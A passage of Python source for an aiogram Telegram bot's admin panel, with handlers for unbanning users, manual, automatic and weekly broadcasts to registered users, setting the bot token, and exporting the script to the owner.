async def panel_unban_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    banned = d.get("banned", [])
    if not banned:
        await safe_answer(cq, "✅ Koi banned nahi!", show_alert=True)
        return
    prefix = "owner" if is_owner(cq.from_user.id, d) else "admin"
    await cq.message.edit_text(
        f"{em(EMOJI_CHECK, '🔓')} <b>Unban User</b>\n\nBanned: <b>{len(banned)}</b>",
        reply_markup=unban_menu_kb(d, prefix),
        parse_mode="HTML"
    )

@R.callback_query(F.data.regexp(r"^(owner|admin):unban:do:(\d+)$"))
async def panel_unban_do(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    ban_id = int(cq.data.split(":")[-1])
    if ban_id in d.get("banned", []):
        d["banned"].remove(ban_id)
        save(d)
    await safe_answer(cq, f"✅ {ban_id} unban ho gaya!", show_alert=True)
    back_text = owner_panel_text(d) if is_owner(uid, d) else admin_panel_text(d)
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await cq.message.edit_text(back_text, reply_markup=back_kb, parse_mode="HTML")
    try:
        await cq.bot.send_message(ban_id, f"{em(EMOJI_CHECK, '✅')} Aapka ban hata diya gaya. /start karein.", parse_mode="HTML")
    except: pass

@R.callback_query(F.data.in_({"owner:broadcast", "admin:broadcast"}))
async def panel_broadcast_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.broadcast)
    back = "owner:home" if is_owner(cq.from_user.id, d) else "admin:home"
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\nJo message bhejni hai woh type karo:",
        reply_markup=kb([(f"{sc('cancel')}", back)]),
        parse_mode="HTML"
    )

@R.message(S.broadcast)
async def panel_broadcast_do(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    await state.clear()
    users = d.get("users", {})
    wait = await msg.answer(f"{em(EMOJI_BELL, '📤')} Broadcasting to <b>{len(users)}</b> users...", parse_mode="HTML")
    ok = 0
    fail = 0
    for uid_str in users:
        try:
            target = int(uid_str)
            if msg.text:
                bcast_text = f"{em(EMOJI_BELL, '📢')} <b>Broadcast</b>\n\n{msg.text}"
                await send_rich_or_fallback(
                    msg.bot, target,
                    rich_broadcast_blocks(msg.text, "📢 Broadcast"),
                    f"📢 <b>Broadcast</b>\n\n{html.escape(msg.text)}"
                )
            else:
                await msg.copy_to(target)
            ok += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    await wait.delete()
    back_kb = owner_kb(d) if is_owner(uid, d) else admin_kb(d)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Broadcast Done!</b>\n\n{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>",
        reply_markup=back_kb,
        parse_mode="HTML"
    )

# ════════════ AUTO BROADCAST (user-drop protection) ════════════
# Owner/admin panel se directly messages + interval set karta hai. Background task
# har 60s check karta hai; interval puri hote hi saare users ko saved messages
# auto-send. last_sent DB mein hota hai — restart pe schedule nahi toot-ta.

def autobc_due(d: dict) -> bool:
    """Interval puri hui ya nahi? (enabled + messages required)"""
    ab = d.get("auto_broadcast") or {}
    if not ab.get("enabled") or not ab.get("messages"):
        return False
    interval_s = max(int(ab.get("interval_hours", 24) or 24), 1) * 3600
    return (time.time() - int(ab.get("last_sent", 0))) >= interval_s

async def do_auto_broadcast(bot: Bot):
    """Saare users ko saved auto-broadcast messages bhejo. Returns (ok, fail)."""
    d = load()
    ab = d.get("auto_broadcast") or {}
    messages = [m for m in ab.get("messages", []) if isinstance(m, str) and m.strip()]
    ok = 0
    fail = 0
    for uid_str in d.get("users", {}):
        try:
            target = int(uid_str)
            for m in messages:
                await send_rich_or_fallback(
                    bot, target,
                    rich_broadcast_blocks(m, "📢 Update"),
                    f"📢 <b>Update</b>\n\n{html.escape(m)}"
                )
                await asyncio.sleep(0.05)
            ok += 1
        except Exception:
            fail += 1
    ab["last_sent"] = int(time.time())
    d["auto_broadcast"] = ab
    save(d)
    log_activity(d, "auto_broadcast_sent", -1, f"{ok} ok / {fail} fail ({len(messages)} msgs)")
    return ok, fail

async def auto_broadcast_loop(bot: Bot):
    """60s tick — interval due hote hi auto-broadcast bhejo (CPU-light, sirf check)."""
    await asyncio.sleep(10)
    while True:
        try:
            if autobc_due(load()):
                log.info("[AUTO-BROADCAST] Interval due — sending to all users...")
                ok, fail = await do_auto_broadcast(bot)
                log.info(f"[AUTO-BROADCAST] Done: {ok} ok / {fail} fail")
        except Exception as exc:
            log.error(f"[AUTO-BROADCAST] loop error: {exc}")
        await asyncio.sleep(60)

def _autobc_panel_text(d: dict) -> str:
    ab = d.get("auto_broadcast") or {}
    msgs = ab.get("messages", [])
    on_off = f"{em(EMOJI_CHECK, '✅')} ON" if ab.get("enabled") else f"{em(EMOJI_CROSS, '❌')} OFF"
    lines = [
        f"{em(EMOJI_BELL, '📢')} <b>Auto Broadcast</b>  (user-drop protection)",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"{em(EMOJI_STAR, '⏱')} Interval: <b>{ab.get('interval_hours', 24)}h</b>",
        f"Messages: <b>{len(msgs)}</b>",
        f"{em(EMOJI_STAR, '🔘')} Status: <b>{on_off}</b>",
    ]
    if ab.get("last_sent"):
        lines.append(f"{em(EMOJI_STAR, '🕐')} Last sent: <b>{fmt_time(int(ab['last_sent']))}</b>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    for i, m in enumerate(msgs[:10], 1):
        _t = m if len(m) <= 60 else m[:57] + "..."
        lines.append(f"{i}. {html.escape(_t)}")
    if len(msgs) > 10:
        lines.append(f"... +{len(msgs) - 10} aur")
    if not msgs:
        lines.append("(abhi koi message nahi)")
    return "\n".join(lines)

def _autobc_kb(d: dict, uid: int) -> InlineKeyboardMarkup:
    back = "owner:home" if is_owner(uid, d) else "admin:home"
    ab = d.get("auto_broadcast") or {}
    on_off = "⏸ pause auto bc" if ab.get("enabled") else "▶️ start auto bc"
    rows = [
        [btn("➕ add message", "autobc:add", None, ""), btn("⏱ set interval", "autobc:interval", None, "")],
        [btn(on_off, "autobc:toggle", EMOJI_BELL, "📢"), btn("🧪 test (send now)", "autobc:test", EMOJI_ROCKET, "🚀")],
    ]
    for i, m in enumerate(ab.get("messages", [])):
        _t = m if len(m) <= 20 else m[:17] + "..."
        rows.append([btn(f"🗑 {_t}", f"autobc:del:{i}", EMOJI_CROSS, "🗑")])
    rows.append([btn("rᴇғrᴇsʜ", "autobc:refresh", EMOJI_GEAR, "🔄"), btn("ʙaᴄᴋ", back, EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data.in_({"owner:autobc", "admin:autobc"}))
async def panel_autobc_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await safe_answer(cq)
    await cq.message.edit_text(_autobc_panel_text(d), reply_markup=_autobc_kb(d, cq.from_user.id), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "autobc:refresh")
async def autobc_refresh(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.clear()
    await safe_answer(cq)
    await cq.message.edit_text(_autobc_panel_text(d), reply_markup=_autobc_kb(d, cq.from_user.id), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "autobc:add")
async def autobc_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.autobc_msg)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '📢')} <b>Auto Broadcast — Add Message</b>\n\n"
        "Naya auto-broadcast message type karo (plain text).\n"
        "Interval pe yahi messages saare users ko auto-send honge.",
        reply_markup=kb([(f"{sc('cancel')}", "autobc:refresh")]),
        parse_mode="HTML"
    )

@R.message(S.autobc_msg, F.text)
async def autobc_add_received(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    txt = (msg.text or "").strip()
    if not txt:
        await msg.answer("❌ Message khali hai. Dobara type karo:")
        return
    ab = d.get("auto_broadcast") or {"enabled": False, "interval_hours": 24, "messages": [], "last_sent": 0}
    if len(ab.get("messages", [])) >= 20:
        await msg.answer("❌ Max 20 messages. Pehle koi delete karo.")
        return
    ab.setdefault("messages", []).append(txt)
    d["auto_broadcast"] = ab
    save(d)
    log_activity(d, "autobc_add", uid, txt[:80])
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Message save ho gaya!", reply_markup=_autobc_kb(d, uid), parse_mode="HTML")

@R.callback_query(F.data == "autobc:interval")
async def autobc_interval_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.autobc_hours)
    await cq.message.edit_text(
        f"{em(EMOJI_BELL, '⏱')} <b>Auto Broadcast — Interval</b>\n\n"
        "Kitne ghante pe repeat karo? (1 se 168 — sirf number bhejo)",
        reply_markup=kb([(f"{sc('cancel')}", "autobc:refresh")]),
        parse_mode="HTML"
    )

@R.message(S.autobc_hours, F.text)
async def autobc_interval_received(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_admin(uid, d):
        await state.clear()
        return
    try:
        hours = int((msg.text or "").strip())
    except Exception:
        await msg.answer("❌ Sirf number bhejo (1 se 168). Dobara try karo:")
        return
    if hours < 1 or hours > 168:
        await msg.answer("❌ 1 se 168 ke beech mein interval rakho. Dobara try karo:")
        return
    ab = d.get("auto_broadcast") or {"enabled": False, "interval_hours": 24, "messages": [], "last_sent": 0}
    ab["interval_hours"] = hours
    d["auto_broadcast"] = ab
    save(d)
    log_activity(d, "autobc_interval", uid, str(hours))
    await state.clear()
    await msg.answer(f"{em(EMOJI_CHECK, '✅')} Interval set: <b>{hours}h</b>", reply_markup=_autobc_kb(d, uid), parse_mode="HTML")

@R.callback_query(F.data == "autobc:toggle")
async def autobc_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    ab = d.get("auto_broadcast") or {"enabled": False, "interval_hours": 24, "messages": [], "last_sent": 0}
    if not ab.get("messages"):
        await safe_answer(cq, "Pehle ek message add karo!", show_alert=True)
        return
    ab["enabled"] = not ab.get("enabled")
    d["auto_broadcast"] = ab
    save(d)
    log_activity(d, "autobc_toggle", uid, "on" if ab["enabled"] else "off")
    await safe_answer(cq)
    await cq.message.edit_text(_autobc_panel_text(d), reply_markup=_autobc_kb(d, uid), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data.startswith("autobc:del:"))
async def autobc_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split(":")[-1])
    ab = d.get("auto_broadcast") or {"enabled": False, "interval_hours": 24, "messages": [], "last_sent": 0}
    msgs = ab.get("messages", [])
    if 0 <= idx < len(msgs):
        msgs.pop(idx)
        d["auto_broadcast"] = ab
        save(d)
        log_activity(d, "autobc_del", uid, str(idx))
        await safe_answer(cq, "🗑 Deleted!", show_alert=True)
    else:
        await safe_answer(cq, "❌ Message nahi mila!", show_alert=True)
    await cq.message.edit_text(_autobc_panel_text(d), reply_markup=_autobc_kb(d, uid), parse_mode="HTML", disable_web_page_preview=True)

@R.callback_query(F.data == "autobc:test")
async def autobc_test(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_admin(uid, d):
        await safe_answer(cq, "🚫 Access Denied!", show_alert=True)
        return
    ab = d.get("auto_broadcast") or {}
    if not ab.get("messages"):
        await safe_answer(cq, "Pehle ek message add karo!", show_alert=True)
        return
    await safe_answer(cq, "🧪 Test send ho raha hai... (saare users ko)", show_alert=True)
    ok, fail = await do_auto_broadcast(cq.bot)
    await cq.message.edit_text(
        _autobc_panel_text(d) + f"\n\n{em(EMOJI_CHECK, '✅')} <b>Test done:</b> {ok} ok / {fail} fail\n"
        f"{em(EMOJI_STAR, '⏱')} Interval abhi se reset ho gaya (agla due: {ab.get('interval_hours', 24)}h baad).",
        reply_markup=_autobc_kb(d, uid), parse_mode="HTML", disable_web_page_preview=True
    )

# ════════════ WEEKLY BROADCAST (owner: msg + day + time, auto every week) ════════════
# Background task har 60s check karta hai (IST). Slot (day+time) due hote hi
# saare users ko message (rich + mandatory normal fallback). 1k users pe bhi
# smooth — 0.05s interval, handler block nahi hota. last_sent DB mein — restart
# pe schedule nahi toot-ta, catch-up send bhi hota hai agar bot down tha.

_WB_DAY_NAMES = {"sunday": 0, "monday": 1, "tuesday": 2, "wednesday": 3, "thursday": 4, "friday": 5, "saturday": 6}
_WB_DAY_LABELS = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"]

def _wb_parse_time(s: str):
    """'HH:MM' / 'HHMM' → (hh, mm) ya None."""
    try:
        s = s.strip().replace(" ", "").lower().lstrip("0").replace("hr", ":").replace("hour", ":")
        if ":" not in s:
            s = s[:2] + ":" + s[2:] if len(s) == 4 else s + ":00" if len(s) == 2 else None
        if s is None:
            return None
        hh, mm = s.split(":", 1)
        hh, mm = int(hh), int(mm)
        if not (0 <= hh <= 23 and 0 <= mm <= 59):
            return None
        return hh, mm
    except Exception:
        return None

def weekly_bc_slot_ts(wb: dict) -> int:
    """PEHLE se hue (pass) latest slot ka timestamp (IST) — catch-up ke liye."""
    hh, mm = 12, 0
    _t = _wb_parse_time(str(wb.get("time", "12:00")))
    if _t:
        hh, mm = _t
    day = int(wb.get("day", 0) or 0) % 7
    now = now_ist()
    days_back = (now.weekday() - day) % 7
    cand = (now - timedelta(days=days_back)).replace(hour=hh, minute=mm, second=0, microsecond=0)
    if cand > now:  # aaj ka time abhi aana baaki hai
        cand = cand - timedelta(days=7)
    return int(cand.timestamp())

def weekly_bc_next_run(wb: dict) -> int:
    """AGLA run ka timestamp (IST) — panel display ke liye."""
    hh, mm = 12, 0
    _t = _wb_parse_time(str(wb.get("time", "12:00")))
    if _t:
        hh, mm = _t
    day = int(wb.get("day", 0) or 0) % 7
    now = now_ist()
    cand = now.replace(hour=hh, minute=mm, second=0, microsecond=0)
    if cand.weekday() != day:
        days_ahead = (day - now.weekday()) % 7
        if days_ahead == 0:
            days_ahead = 7
        cand = (now + timedelta(days=days_ahead)).replace(hour=hh, minute=mm, second=0, microsecond=0)
    elif cand <= now:
        cand = cand + timedelta(days=7)
    return int(cand.timestamp())

def weekly_bc_due(d: dict) -> bool:
    wb = d.get("weekly_broadcast") or {}
    if not wb.get("enabled") or not (wb.get("message") or "").strip():
        return False
    slot = weekly_bc_slot_ts(wb)
    return int(wb.get("last_sent", 0)) < slot <= time.time()

async def do_weekly_broadcast(bot: Bot) -> tuple:
    """Saare users ko weekly message bhejo (rich + mandatory normal fallback)."""
    d = load()
    wb = d.get("weekly_broadcast") or {}
    msg_text = (wb.get("message") or "").strip()
    if not msg_text:
        return 0, 0
    blocks = rich_broadcast_blocks(msg_text, "📅 Weekly Update")
    fallback = f"📅 <b>Weekly Update</b>\n\n{html.escape(msg_text)}\n\n— {SUPER_ADMIN_NAME}"
    ok = 0
    fail = 0
    for uid_str in d.get("users", {}):
        try:
            target = int(uid_str)
            res = await send_rich_or_fallback(bot, target, blocks, fallback)
            if res:
                ok += 1
            else:
                fail += 1
        except Exception:
            fail += 1
        await asyncio.sleep(0.05)
    wb["last_sent"] = int(time.time())
    d["weekly_broadcast"] = wb
    save(d)
    log_activity(d, "weekly_broadcast_sent", -1, f"{ok} ok / {fail} fail")
    return ok, fail

async def weekly_broadcast_loop(bot: Bot):
    """60s tick — weekly slot due hote hi saare users ko bhejo (CPU-light)."""
    await asyncio.sleep(10)
    while True:
        try:
            if weekly_bc_due(load()):
                log.info("[WEEKLY-BC] Slot due — sending to all users...")
                ok, fail = await do_weekly_broadcast(bot)
                log.info(f"[WEEKLY-BC] Done: {ok} ok / {fail} fail")
                # Owner ko notify — kya bheja, kitna success/fail
                try:
                    _owners = load().get("owners", [MAIN_OWNER]) or [MAIN_OWNER]
                    _rep = (f"📅 <b>Weekly Broadcast sent!</b>\n\n"
                            f"{em(EMOJI_CHECK, '✅')} Delivered: <b>{ok}</b>\n"
                            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{fail}</b>")
                    for o in _owners[:3]:
                        await bot.send_message(o, _rep, parse_mode="HTML")
                except Exception as e:
                    log.warning(f"[WEEKLY-BC] owner notify fail: {e}")
        except Exception as exc:
            log.error(f"[WEEKLY-BC] loop error: {exc}")
        await asyncio.sleep(60)

def _weekly_bc_panel_text(d: dict) -> str:
    wb = d.get("weekly_broadcast") or {}
    on_off = f"{em(EMOJI_CHECK, '✅')} ᴏɴ" if wb.get("enabled") else f"{em(EMOJI_CROSS, '❌')} ᴏғғ"
    msg = (wb.get("message") or "").strip()
    msg_preview = (msg[:80] + "…") if len(msg) > 80 else (msg or "(abhi koi message nahi)")
    lines = [
        f"📅 <b>Weekly Broadcast</b>  (har hafte auto)",
        "━━━━━━━━━━━━━━━━━━━━━━",
        f"📆 {sc('day')}   : <b>{_WB_DAY_LABELS[int(wb.get('day', 0) or 0) % 7]}</b>",
        f"⏰ {sc('time')}  : <b>{str(wb.get('time', '12:00'))}</b> IST",
        f"📝 {sc('message')} :",
        f"   <i>{html.escape(msg_preview)}</i>",
        f"🔘 {sc('status')} : {on_off}",
    ]
    if int(wb.get("last_sent", 0)):
        lines.append(f"🕐 {sc('last sent')} : <b>{fmt_time(int(wb['last_sent']))}</b>")
    if msg:
        lines.append(f"⏭ {sc('next run')} : <b>{fmt_time(weekly_bc_next_run(wb))}</b>")
    lines.append("━━━━━━━━━━━━━━━━━━━━━━")
    lines.append("<i>Background mein auto-chalta hai — bot restart pe bhi schedule nahi toot-ta.</i>")
    return "\n".join(lines)

def _weekly_bc_kb(d: dict, uid: int) -> InlineKeyboardMarkup:
    wb = d.get("weekly_broadcast") or {}
    on_off = "⏸ pause weekly bc" if wb.get("enabled") else "▶️ start weekly bc"
    rows = [
        [btn("📝 set message", "wkb:set_msg", None, ""), btn("📆 set day", "wkb:set_day", None, "")],
        [btn("⏰ set time", "wkb:set_time", None, ""), btn(on_off, "wkb:toggle", EMOJI_BELL, "📅")],
        [btn("🧪 test (send now)", "wkb:test", EMOJI_ROCKET, "🚀"), btn("🗑 clear message", "wkb:clear", EMOJI_CROSS, "🗑")],
        [btn("rᴇғʀᴇsʜ", "wkb:refresh", EMOJI_GEAR, "🔄"), btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")],
    ]
    return InlineKeyboardMarkup(inline_keyboard=rows)

@R.callback_query(F.data == "owner:weekly_bc")
async def panel_weekly_bc(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await cq.message.edit_text(
        _weekly_bc_panel_text(d),
        reply_markup=_weekly_bc_kb(d, cq.from_user.id),
        parse_mode="HTML", disable_web_page_preview=True
    )

@R.callback_query(F.data == "wkb:refresh")
async def wkb_refresh(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await cq.message.edit_text(
        _weekly_bc_panel_text(d),
        reply_markup=_weekly_bc_kb(d, cq.from_user.id),
        parse_mode="HTML", disable_web_page_preview=True
    )

@R.callback_query(F.data == "wkb:set_msg")
async def wkb_set_msg_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.weekly_bc_msg)
    await cq.message.edit_text(
        f"📝 <b>Weekly Broadcast Message</b>\n\n"
        f"Jo message har hafte saare users ko jana hai woh bhejo:",
        reply_markup=kb([(f"{sc('cancel')}", "wkb:refresh")]),
        parse_mode="HTML"
    )

@R.message(S.weekly_bc_msg, F.text)
async def wkb_set_msg_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    wb = d.get("weekly_broadcast") or {}
    wb["message"] = msg.text.strip()[:3500]
    d["weekly_broadcast"] = wb
    log_activity(d, "weekly_bc_msg", uid, wb["message"][:80])
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Weekly message save ho gaya!",
        reply_markup=_weekly_bc_kb(d, uid), parse_mode="HTML"
    )

@R.callback_query(F.data == "wkb:set_day")
async def wkb_set_day_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.weekly_bc_day)
    await cq.message.edit_text(
        f"📆 <b>Day Select</b>\n\n"
        f"0=Sunday 1=Monday 2=Tuesday 3=Wednesday 4=Thursday 5=Friday 6=Saturday\n"
        f"(ya name bhi chalega: monday / friday ...)",
        reply_markup=kb([(f"{sc('cancel')}", "wkb:refresh")]),
        parse_mode="HTML"
    )

@R.message(S.weekly_bc_day, F.text)
async def wkb_set_day_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    raw = msg.text.strip().lower()
    day = None
    if raw.isdigit() and 0 <= int(raw) <= 6:
        day = int(raw)
    elif raw in _WB_DAY_NAMES:
        day = _WB_DAY_NAMES[raw]
    if day is None:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid day do (0-6 ya name):", parse_mode="HTML")
        return
    wb = d.get("weekly_broadcast") or {}
    wb["day"] = day
    d["weekly_broadcast"] = wb
    log_activity(d, "weekly_bc_day", uid, _WB_DAY_LABELS[day])
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Day set: <b>{_WB_DAY_LABELS[day]}</b>",
        reply_markup=_weekly_bc_kb(d, uid), parse_mode="HTML"
    )

@R.callback_query(F.data == "wkb:set_time")
async def wkb_set_time_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        return
    await state.set_state(S.weekly_bc_time)
    await cq.message.edit_text(
        f"⏰ <b>Time Set (IST, 24h)</b>\n\n"
        f"Format: <code>HH:MM</code> — example: <code>12:00</code>, <code>20:30</code>",
        reply_markup=kb([(f"{sc('cancel')}", "wkb:refresh")]),
        parse_mode="HTML"
    )

@R.message(S.weekly_bc_time, F.text)
async def wkb_set_time_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    _t = _wb_parse_time(msg.text.strip())
    if not _t:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid time do — format <code>HH:MM</code> (24h):", parse_mode="HTML")
        return
    wb = d.get("weekly_broadcast") or {}
    wb["time"] = f"{_t[0]:02d}:{_t[1]:02d}"
    d["weekly_broadcast"] = wb
    log_activity(d, "weekly_bc_time", uid, wb["time"])
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Time set: <b>{wb['time']} IST</b>",
        reply_markup=_weekly_bc_kb(d, uid), parse_mode="HTML"
    )

@R.callback_query(F.data == "wkb:toggle")
async def wkb_toggle(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    wb = d.get("weekly_broadcast") or {}
    if not (wb.get("message") or "").strip():
        await safe_answer(cq, "Pehle message set karo!", show_alert=True)
        return
    wb["enabled"] = not wb.get("enabled")
    d["weekly_broadcast"] = wb
    log_activity(d, "weekly_bc_toggle", uid, "ON" if wb["enabled"] else "OFF")
    save(d)
    _note = ""
    if wb["enabled"]:
        _note = f"\n\n{em(EMOJI_STAR, '⏭')} Agla run: <b>{fmt_time(weekly_bc_next_run(wb))}</b>"
    await safe_answer(cq, f"{'✅ Weekly broadcast ON' if wb['enabled'] else '⏸ Weekly broadcast OFF'}{_note.replace('<b>', '').replace('</b>', '')}", show_alert=True)
    await cq.message.edit_text(
        _weekly_bc_panel_text(d),
        reply_markup=_weekly_bc_kb(d, uid),
        parse_mode="HTML", disable_web_page_preview=True
    )

@R.callback_query(F.data == "wkb:clear")
async def wkb_clear(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    wb = d.get("weekly_broadcast") or {}
    wb["message"] = ""
    wb["enabled"] = False
    d["weekly_broadcast"] = wb
    log_activity(d, "weekly_bc_clear", uid, "")
    save(d)
    await safe_answer(cq, "🗑 Weekly message clear ho gaya!", show_alert=True)
    await cq.message.edit_text(
        _weekly_bc_panel_text(d),
        reply_markup=_weekly_bc_kb(d, uid),
        parse_mode="HTML", disable_web_page_preview=True
    )

@R.callback_query(F.data == "wkb:test")
async def wkb_test(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    if not is_owner(uid, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    if not (d.get("weekly_broadcast", {}).get("message") or "").strip():
        await safe_answer(cq, "Pehle message set karo!", show_alert=True)
        return
    await safe_answer(cq, "🧪 Test send ho raha hai... (saare users ko)", show_alert=True)
    ok, fail = await do_weekly_broadcast(cq.bot)
    d = load()
    await cq.message.edit_text(
        _weekly_bc_panel_text(d) + f"\n\n{em(EMOJI_CHECK, '✅')} <b>Test done:</b> {ok} ok / {fail} fail\n"
        f"{em(EMOJI_STAR, '⏰')} last_sent reset ho gaya — schedule normal chalta rahega.",
        reply_markup=_weekly_bc_kb(d, uid), parse_mode="HTML", disable_web_page_preview=True
    )

# ════════════ SET BOT TOKEN (DB mein — agla restart pe apply) ════════════
# Priority: env > DB > code. VPS pe env chalta hai; DB token tab kaam aata hai
# jab env nahi hai (ya local run). Naya token AGLE restart pe active hota hai
# (live Bot instance ka token mid-run change nahi ho sakta).

@R.callback_query(F.data == "owner:set_token")
async def owner_set_token_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.set_token)
    _cur = str(d.get("bot_token") or "").strip()
    _cur_note = (f"\n\n🪙 <b>Currently in DB:</b> <code>{_cur[:10]}...{_cur[-4:]}</code>" if _cur
                 else f"\n\n🪙 <b>Currently in DB:</b> (empty — env/code fallback chal raha hai)")
    await cq.message.edit_text(
        f"🔑 <b>Set Bot Token</b>\n\n"
        f"Naya BotFather token bhejo (format: <code>123456789:AA...</code>)\n"
        f"{_cur_note}\n\n"
        f"<i>Token save hoga — <b>agla restart</b> pe active hoga.\n"
        f"Priority: env &gt; DB &gt; code.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.set_token, F.text)
async def owner_set_token_done(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    if not is_owner(uid, d):
        await state.clear()
        return
    tok = msg.text.strip()
    if not TOKEN_RE.match(tok):
        await msg.answer(
            f"{em(EMOJI_CROSS, '❌')} Invalid token format!\n"
            f"Sahi format: <code>123456789:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</code>",
            parse_mode="HTML"
        )
        return
    d["bot_token"] = tok
    log_activity(d, "bot_token_set", uid, f"{tok[:8]}...{tok[-4:]}")
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Token DB mein save ho gaya!</b>\n\n"
        f"🪙 <code>{tok[:8]}...{tok[-4:]}</code>\n\n"
        f"{em(EMOJI_WARNING, '⚠️')} Ye token <b>agla restart</b> hone pe active hoga.\n"
        f"(Priority: env &gt; DB &gt; code — agar env mein BOT_TOKEN hai toh wahi chalega.)",
        reply_markup=kb([(f"{sc('back')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:export_script")
async def owner_export_script(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Owner Only!", show_alert=True)
        return
    await safe_answer(cq, "📤 Exporting...")
    try:
        script_path = os.path.abspath(__file__)
        if not os.path.exists(script_path):
            script_path = _DATA_FILE.replace(".json", ".py")
            if not os.path.exists(script_path):
                script_path = "blast_bot_v3.2_premium.py"
        await cq.message.reply_document(
            document=FSInputFile(script_path),
            caption=f"{em(EMOJI_GEAR, '📤')} <b>Script Export</b> — <i>{_VERSION}</i>",
            parse_mode="HTML"
        )
    except Exception as e:
        await safe_answer(cq, f"❌ Export failed: {str(e)[:40]}", show_alert=True)

@R.callback_query(F.data.in_({"admin:home", "admin:refresh"}))
async def admin_home(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    d = load()
    if not is_admin(cq.from_user.id, d):
        await safe_answer(cq, "🚫 Admin Only!", show_alert=True)
        return
    try:
        await cq.message.edit_text(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
